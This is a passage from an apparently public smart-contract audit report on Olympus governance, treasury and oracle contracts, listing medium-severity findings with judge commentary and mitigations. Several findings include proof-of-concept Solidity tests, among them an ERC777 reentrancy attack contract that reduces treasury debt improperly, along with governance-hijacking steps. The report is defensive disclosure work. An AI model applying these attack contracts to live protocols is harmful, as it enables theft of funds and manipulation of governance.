}\n\n        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;\n\n        VOTES.transferFrom(msg.sender, address(this), userVotes);\n\n        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);\n    }\n\n```\n\n### Recommended Mitigation Steps\n\nAdd time delay when activating a proposal, so that users can be aware of that and vote for the current one within the time window.\n\n**[fullyallocated (Olympus) disputed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1234872386):**\n > This is a pretty unique edge case, I can acknowledge as QA.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1249571276):**\n > I actually don't think its that unique in the case of on chain voting. Imagine a scenario where a user submits a vote with low gas amounts and it is not mined for days later and then the active proposal has changed.  I am not sure why the `vote` function wouldn't take in the intended proposal ID. \n> \n> I am going to leave as medium severity as I do think this impacts the intended functionality of the protocol, but am willing to hear more from the sponsor on why they disagree.\n\n\n\n***\n\n## [[M-10] Voted votes cannot change after the user is issued new votes or the user's old votes are revoked during voting](https://github.com/code-423n4/2022-08-olympus-findings/issues/275)\n_Submitted by rbserver, also found by &#95;&#95;141345&#95;&#95;, cccz, csanuragjain, GalloDaSballo, Guardian, Lambda, m9800, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>\n\nA user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262>\n\n```solidity\n    function vote(bool for_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (activeProposal.proposalId == 0) {\n            revert NoActiveProposalDetected();\n        }\n\n        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n            revert UserAlreadyVoted();\n        }\n\n        if (for_) {\n            yesVotesForProposal[activeProposal.proposalId] += userVotes;\n        } else {\n            noVotesForProposal[activeProposal.proposalId] += userVotes;\n        }\n\n        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;\n\n        VOTES.transferFrom(msg.sender, address(this), userVotes);\n\n        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48>\n\n```solidity\n    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Issue the votes in the VOTES module\n        VOTES.mintTo(wallet_, amount_);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56>\n\n```solidity\n    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Revoke the votes in the VOTES module\n        VOTES.burnFrom(wallet_, amount_);\n    }\n```\n\n### Proof of Concept\n\nPlease add the following code in `src\\test\\policies\\Governance.t.sol`.\n\nFirst, please add the following code for `stdError`.\n\n```solidity\nimport {Test, stdError} from \"forge-std/Test.sol\";    // @audit import stdError for testing purpose\n```\n\nThen, please append the following tests. These tests will pass to demonstrate the described scenarios.\n\n```solidity\n    function testScenario_UserCannotVoteAgainWithNewlyMintedVotes() public {\n        _createActiveProposal();\n\n        // voter3 votes for the proposal\n        vm.prank(voter3);\n        governance.vote(true);\n\n        assertEq(governance.yesVotesForProposal(1), 300);\n        assertEq(governance.noVotesForProposal(1), 0);\n\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n\n        // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here\n        vm.prank(godmode);\n        VOTES.mintTo(voter3, 500);\n        assertEq(VOTES.balanceOf(voter3), 500);\n\n        // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes\n        vm.expectRevert(UserAlreadyVoted.selector);\n        vm.prank(voter3);\n        governance.vote(true);\n    }\n```\n\n```solidity\n    function testScenario_RevokeVotesAfterUserFinishsOwnVoting() public {\n        _createActiveProposal();\n\n        // voter3 votes for the proposal\n        vm.prank(voter3);\n        governance.vote(true);\n\n        assertEq(governance.yesVotesForProposal(1), 300);\n        assertEq(governance.noVotesForProposal(1), 0);\n\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n\n        // To simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here.\n        // However, calling VOTES.burnFrom will revert due to arithmetic underflow.\n        vm.prank(godmode);\n        vm.expectRevert(stdError.arithmeticError);\n        VOTES.burnFrom(voter3, 300);\n\n        // the proposal is still voted with voter3's previous votes afterwards\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/275#issuecomment-1236238446):**\n > This is the best written answer. \n>\n > Originally votes were locked so that users cannot constantly change their vote to manipulate the outcome but the warden makes a good point about how the quorum thresholds can be changed and the affects on how consensus is calculated.\n\n\n\n***\n\n## [[M-11] OlympusGovernance: Users can prevent their votes from being revoked](https://github.com/code-423n4/2022-08-olympus-findings/issues/308)\n_Submitted by cccz, also found by zzzitron_\n\nIn the VoterRegistration contract, voter_admin can call the revokeVotesFrom function to revoke the user's votes.\n\n        function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n            // Revoke the votes in the VOTES module\n            VOTES.burnFrom(wallet_, amount_);\n        }\n\nBut there is a way for users to prevent their votes from being revoked by voter_admin.<br>\nIn the OlympusGovernance contract, the user can call the vote function to vote for the activeProposal, and then call the reclaimVotes function to reclaim his votes.<br>\nWhen the vote function is called, VOTES are sent to the OlympusGovernance contract and recorded using the userVotesForProposal variable. When the reclaimVotes function is called, the VOTES recorded in the userVotesForProposal variable are sent back to the user.<br>\nThis means that the user can **store** his VOTES tokens in userVotesForProposal.<br>\nThe revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal and the reclaimVotes function can only be called by the user himself.<br>\nIf the user calls the reclaimVotes function and vote function in one transaction, then his VOTES token balance will always be 0 (thus avoiding revocation of votes by voter_admin) and he will be able to vote.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L240-L262><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L295-L313><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L53-L56>\n\n### Recommended Mitigation Steps\n\nConsider allowing to call the reclaimVotes function to reclaim any user's vote, thus avoiding the user storing his VOTES tokens in userVotesForProposal\n\n        function reclaimVotes(uint256 proposalId_, address user_) external {\n            uint256 userVotes = userVotesForProposal[proposalId_][user_];\n\n            if (userVotes == 0) {\n                revert CannotReclaimZeroVotes();\n            }\n\n            if (proposalId_ == activeProposal.proposalId) {\n                revert CannotReclaimTokensForActiveVote();\n            }\n\n            if (tokenClaimsForProposal[proposalId_][user_] == true) {\n                revert VotingTokensAlreadyReclaimed();\n            }\n\n            tokenClaimsForProposal[proposalId_][user_] = true;\n\n            VOTES.transferFrom(address(this), user_, userVotes);\n        }\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1234876428):**\n > This is true, we don't expect to use the voter admin in production, just to issue votes during internal testing period.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1252360367):**\n > Downgrading to M severity as this does not lead to direct loss of user funds, but does highlight an issue with current contracts. \n\n**[cccz (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255045809):**\n > Consider the following scenarios.\n> There are currently three users, A, B and C, in the system.\n> 1. voter_admin minted 100 VOTEs for each of these three users\n> 2. After a period of time, due to system upgrade or other reasons, the VOTEs of the users need to be revoked.\n> 3. voter_admin revokes the VOTEs of users A and B respectively, but user C uses this vulnerability to prevent his VOTE from being revoked.\n> 4. At this time, user C has all the VOTEs, and he can execute any proposal.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255056253):**\n > Okay, at this point I still believe a Medium issue, voter_admin as a mitigation could reissue votes to User A and B. Additionally User C will eventually have to reclaim these votes in order to vote on the next proposal.  I am going to stick with Medium on this one. Appreciate the additional clarity. \n\n**[cccz (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255062224):**\n > @0xean - You are right, thanks for your attention.\n\n\n\n***\n\n## [[M-12] Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible](https://github.com/code-423n4/2022-08-olympus-findings/issues/317)\n_Submitted by minhtrng_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67><br>\n\nAny withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.\n\n### Proof of Concept\n\nThe function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of \"revoking a deactivated policy's approvals\". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.\n\n### Tools Used\n\nIDE (Remix, VSCode)\n\n### Recommended Mitigation Steps\n\nA partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:\n\nAs a public variable in Kernel.sol\n`mapping(address => bool) public isRegisteredPolicy;`\n\nin Kernel.activatePolicy():\n`isRegisteredPolicy[address(policy_)] ) = true;`\n\nand finally in TreasuryCustodian.revokePolicyApprovals():\n`if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/317#issuecomment-1241262776):**\n > TODOs are outdated, I forgot to clear them ;(. But the points are taken. Code will be adjusted, but probably not the way from the recommendation. Instead will gate the function behind custodian role.\n\n\n\n***\n\n## [[M-13] Missing checks in `Kernel._deactivatePolicy`](https://github.com/code-423n4/2022-08-olympus-findings/issues/368)\n_Submitted by enckrish_\n\nThere are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325>\n\n### Recommended Mitigation Steps\n\nAdding `require(activePolicies[idx] == policy_, \"Unregistered policy\");` will prevent this, where `idx = getPolicyIndex[policy_]`.\n\n**NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor.\n\n**[ind-igo (Olympus) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1241160679):**\n > Confirmed. Should be lower risk or a QA issue.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1251627251):**\n > @ind-igo - can you comment on why you think it should be QA vs Medium?\n> \n> `\n>  — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> I would expect this to impact the functionality of the protocol. \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255251454):**\n > This one seems on the fence to me. While accidentally unregistering a policy likely would affect the functionality of the protocol, it requires the executor to make a mistake. If the mistake is made, it's easily remedied by re-registering the policy.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255293207):**\n > That makes sense, but there would be some amount of down time when this occurred. I think Medium is correct for this issue. \n\n\n\n***\n\n## [[M-14] The governance system can be held hostage by a malicious user](https://github.com/code-423n4/2022-08-olympus-findings/issues/375)\n_Submitted by d3e4, also found by Aymen0909 and pedroais_\n\nWith only [`ENDORSEMENT_THRESHOLD`](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L130)% (currently 20%) voting power, a malicious user can prevent any other proposal from being activated.\nWhile `ENDORSEMENT_THRESHOLD` is currently fairly high, it seems not higher than that it might not be used to hold the system hostage to extract far more funds.\n\n### Proof of Concept\n\n[Submit](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159) a dummy proposal, [endorse](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L180) it and then [activate](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205) it. Now, no other proposal can be activated for a [`GRACE_PERIOD`](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L127). When this time period is over, this procedure may be repeated, either immediately or just before any other proposal activation by front-running.\n\n### Recommended Mitigation Steps\n\nMaking sure `ENDORSEMENT_THRESHOLD` is at least 50% seems discouraging enough. Other more creative solutions should be possible. One might be to let the most endorsed proposal be activated, or restricting who can activate a proposal; anything that at least temporarily liberates the governance system so that the attacker is dissuaded from investing in this attack method.\n\n**[fullyallocated (Olympus) acknowledged](https://github.com/code-423n4/2022-08-olympus-findings/issues/375)**\n\n\n\n***\n\n## [[M-15] Heart will stop if all rewards are swept](https://github.com/code-423n4/2022-08-olympus-findings/issues/378)\n_Submitted by GalloDaSballo, also found by cccz, itsmeSTYJ, and PwnPatrol_\n\nRewards for Heart `beat` are sent via `_issueReward`\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115>\n\n```solidity\n\n    function _issueReward(address to_) internal {\n        rewardToken.safeTransfer(to_, reward);\n        emit RewardIssued(to_, reward);\n    }\n\n```\n\nThe function doesn't check for available tokens e.g.<br>\n`min(reward, rewardToken.balanceOf(address(this)));`\n\nIn case of calling `withdrawUnspentRewards`\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152>\n\n```solidity\n    /// @inheritdoc IHeart\n    function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") {\n        token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));\n    }\n```\n\nBecause the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.\n\nWhile a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.\n\n### Recommended Mitigation Steps\n\nAdd a check for available tokens\n`min(reward, rewardToken.balanceOf(address(this)));`\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/378#issuecomment-1239855093):**\n > Agree based on the anti-DOS characteristics of using a min operation.\n\n\n\n***\n\n## [[M-16] Inconsistant parameter requirements between `constructor()` and `Set() functions` in `RANGE.sol` and `Operator.sol`.](https://github.com/code-423n4/2022-08-olympus-findings/issues/379)\n_Submitted by hansfriese, also found by datapunk and itsmeSTYJ_\n\nInconsistant parameter requirements between `constructor` and `Set() functions` in `RANGE.sol` and `Operator.sol`.\n\nThe contracts might work unexpectedly when the params are set improperly using `constructor()`.\n\n### Proof of Concept\n\n*   In `RANGE.sol`, [setSpreads()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L244-L250) and [setThresholdFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L264) has some requirements but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L80) doesn't check at all.\n\n```\n    File: 2022-08-olympus\\src\\modules\\RANGE.sol\n    242:     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n    243:         // Confirm spreads are within allowed values\n    244:         if (\n    245:             wallSpread_ > 10000 ||\n    246:             wallSpread_ < 100 ||\n    247:             cushionSpread_ > 10000 ||\n    248:             cushionSpread_ < 100 ||\n    249:             cushionSpread_ > wallSpread_\n    250:         ) revert RANGE_InvalidParams();\n    251: \n    252:         // Set spreads\n    253:         _range.wall.spread = wallSpread_;\n    254:         _range.cushion.spread = cushionSpread_;\n    255: \n    256:         emit SpreadsChanged(wallSpread_, cushionSpread_);\n    257:     }\n```\n```\n\n    File: 2022-08-olympus\\src\\modules\\RANGE.sol\n    263:     function setThresholdFactor(uint256 thresholdFactor_) external permissioned {\n    264:         if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();\n    265:         thresholdFactor = thresholdFactor_;\n    266: \n    267:         emit ThresholdFactorChanged(thresholdFactor_);\n    268:     }\n    269: \n```\n\n*   In `Operator.sol`, [setCushionFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L518) checks the requirement but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L134) doesn't check it.\n\n```\n\n    File: 2022-08-olympus\\src\\policies\\Operator.sol\n    516:     function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {\n    517:         /// Confirm factor is within allowed values\n    518:         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\n    519: \n    520:         /// Set factor\n    521:         _config.cushionFactor = cushionFactor_;\n    522: \n    523:         emit CushionFactorChanged(cushionFactor_);\n    524:     }\n    525: \n```\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nRecommend adding same validation for the parameters between `constructor()` and `Set()` functions.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1238786025):**\n > Agree that the constructor should validate these parameters, but it is only an issue if configured improperly. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1251087775):**\n > While I am typically weary of marking input validations as medium severity, I do think in this case it's warranted as it directly leads to malfunctions at the protocol level and it seems that the sponsors thought it important enough to add the checks elsewhere. Hard call, but will award it at medium severity.   \n\n\n\n***\n\n## [[M-17] No Cap on Amount of VOTES means the `voter_admin` can get any proposal to pass](https://github.com/code-423n4/2022-08-olympus-findings/issues/380)\n_Submitted by GalloDaSballo, also found by 0xNazgul, IllIllI, and rbserver_\n\nBecause `VOTES` can be minted by `voter_admin`, and there is no cap on totalSupply, the `voter_admin` has the privileged ability to mint as many `VOTES` as they want in order to get any proposal to pass or veto it.\n\n### Proof of Concept - Veto\n\n*   Be `voter_admin`\n*   Mint XYZ tokens\n*   totalSupply is now higher so any proposal can be [vetoed per this line](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268-L269)\n\n### Proof of Concept - Approve\n\n*   Be `voter_admin`\n*   Mint XYZ tokens, where XYZ allows the `netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD` check to pass\n*   Mint `VOTES` to self\n*   Vote\n*   Proposal has passed\n\n### Recommended Mitigation Steps\n\nAdd a total supply cap to `VOTES`.\n\n**[fullyallocated (Olympus) disputed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1236240959):**\n > This is possible but will not happen in a production environment because we're using this for internal testing.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1251636550):**\n > Given the scope of the contracts the wardens were asked to review, I think this issue is valid. While I understand that the `voter_admin` is trusted, I don't think users expect the admin to be able to bypass any votes results in this manner. \n\n\n\n***\n\n## [[M-18] Inconsistency in staleness checks between OHM and reserve token oracles](https://github.com/code-423n4/2022-08-olympus-findings/issues/391)\n_Submitted by okkothejawa, also found by datapunk, reassor, and Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171><br>\n\nPrice oracle may fail and revert due to the inconsistency in the staleness checks.\n\n### Proof of Concept\n\nIn the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.\n\n### Tools Used\n\nManual review, talking with devs\n\n### Recommended Mitigation Steps\n\nChange the line 171 to\n\n                if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))\n\nlike line 165.\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/391#issuecomment-1238515996):**\n > This should indeed be the same. We will update to fix.\n\n\n\n***\n\n## [[M-19] TRSRY: reenter from `OlympusTreasury::repayLoan` to `Operator::swap`](https://github.com/code-423n4/2022-08-olympus-findings/issues/403)\n_Submitted by zzzitron_\n\nOne can repay loan to the treasury with the value from the `Operator::swap`.\n\nCondition:\n\n*   the reserve token in Operator has hook for sender (like ERC777)\n*   the debt is the same token as reserve\n\n### Proof of Concept\n\nThe below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).\n\nLet's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.\n\nIn the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.\n\n```solidity\n/// Mock to simulate the senders hook\n/// for simplicity omitted the certain aspects like ERC1820 registry and etc.\ncontract MockERC777 is MockERC20 {\n    constructor () MockERC20(\"ERC777\", \"777\", 18) {}\n\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {\n        _callTokenToSend(from, to, amount);\n        return super.transferFrom(from, to, amount);\n        // _callTokenReceived(from, to, amount);\n    }\n\n    // simplified implementation for ERC777\n    function _callTokenToSend(address from, address to, uint256 amount) private {\n      if (from != address(0)) {\n        IERC777Sender(from).tokensToSend(from, to, amount);\n      }\n    }\n}\n\ninterface IERC777Sender {\n  function tokensToSend(address from, address to, uint256 amount) external;\n}\n\n/// Concept for an attack contract\ncontract Reenterer is IERC777Sender {\n  ERC20 public token;\n  Operator public operator;\n  bool public entered;\n\n  constructor(address token_, Operator op_) {\n    token = ERC20(token_);\n    operator = op_;\n  }\n\n  function tokensToSend(address from, address to, uint256 amount) external override {\n    if (!entered) {\n    // call swap from reenter\n    // which will manipulate the balance of treasury\n      entered = true;\n      operator.swap(token, 1e17, 0);\n    }\n  }\n  \n  function attack(OlympusTreasury treasury) public {\n    // approve to the treasury\n    token.approve(address(treasury), 1e18);\n    token.approve(address(operator), 100* 1e18);\n\n    // repayDebt of 1e17\n    treasury.repayLoan(token, 1e17);\n  }\n}\n```\n\n```solidity\n/// the test\n    function test_poc__reenter() public {\n        vm.prank(guardian);\n        operator.initialize();\n\n      reserve.mint(address(reenterer), 1e18);\n      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);\n      // start repayLoan\n      reenterer.attack(treasury);\n      // it should be 9 * 1e17 but it is 8 * 1e17\n      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);\n    }\n```\n\n### Cause\n\nThe `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.\n\n```solidity\n// OlympusTreasury::repayLoan\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112\n105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {\n106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();\n107\n108         // Deposit from caller first (to handle nonstandard token transfers)\n109         uint256 prevBalance = token_.balanceOf(address(this));\n110         token_.safeTransferFrom(msg.sender, address(this), amount_);\n111\n112         uint256 received = token_.balanceOf(address(this)) - prevBalance;\n```\n\nIn the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.\n\n```solidity\n// Operator::swap\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330\n329             /// Transfer reserves to treasury\n330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);\n```\n\nAlthough both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nThe deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1241204868):**\n > Good report, although very low risk as the preconditions are extremely unlikely. Will take into account the suggestion by adding a comment to the function. Thank you.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1251655815):**\n > I would probably downgrade to QA, but the warden does a good job of proving the point out with examples.  Will leave as Medium.\n\n\n\n***\n\n## [[M-20] Operator: if WallSpread is 10000, `operate` and `beat` will revert and price information cannot be updated anymore](https://github.com/code-423n4/2022-08-olympus-findings/issues/404)\n_Submitted by zzzitron_\n\nThe `beat` cannot be called anymore and price information will not be updated\n\nCondition:\n\n*   the wallspread is set to 10000 (100%)\n*   lower wall is active (range.low\\.active==true)\n*   the price falls into the lower cushion (currentPrice < range.cushion.low\\.price && currentPrice > range.wall.low\\.price), therefore activates the lower bond market\n\n### Proof of Concept\n\nThe below proof of concept demonstrates that the `operate` will revert with 100% wallspread. The full test code can be found [here](https://gist.github.com/zzzitron/74dfbc0249151a682061cd6532628d87) as well as [the diff from `Operator.t.sol`](https://gist.github.com/zzzitron/216d67cc0c7def5450b921f9c7f9ae91).\n\nIn the test, the wallspread was set to 10000, which is 100% (line 51). The price was set so that the lower market should be deployed (line 59). In the market deployment logic (`Operator::_activate`) will revert due to division by zero, and `operate` will fail.\n\nOnce this condition is met, the `operate` cannot be called and `Heart::beat` cannot be called as well, since the `Heart::beat` is calling `Operator::opearate` under the hood. As the result the price can never be updated. But other codes who uses the price information will not know that the price information is stale. If the upper wall is active and still have the capacity, one can swap from the upper wall using the stale information, which might cause some loss of funds.\n\n```solidity\n    function test_poc__lowCushionDeployWithWallspread10000Reverts() public {\n        /// Initialize operator\n        vm.prank(guardian);\n        operator.initialize();\n\n        /// if the wallspread is 10000 the operate might revert\n        vm.prank(policy);\n        operator.setSpreads(7000, 10000);\n\n        /// Confirm that the cushion is not deployed\n        assertTrue(!auctioneer.isLive(range.market(true)));\n\n        /// Set price on mock oracle into the lower cushion\n        /// given the lower wallspread is 